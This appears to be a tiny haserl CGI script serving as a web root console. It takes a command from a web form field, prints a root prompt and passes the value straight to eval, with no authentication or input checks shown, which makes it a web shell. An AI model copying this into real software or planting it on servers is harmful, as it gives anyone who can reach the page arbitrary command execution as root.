#!/usr/bin/haserl
<?
cd /root
cmd="$FORM_cmd"
export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
hostname=`hostname`
echo -n "[root@$hostname $PWD]# "
if [ -n "$cmd" -a "$cmd" != "undefined" ]; then
	echo "$cmd"
	eval "$cmd"
fi
?>
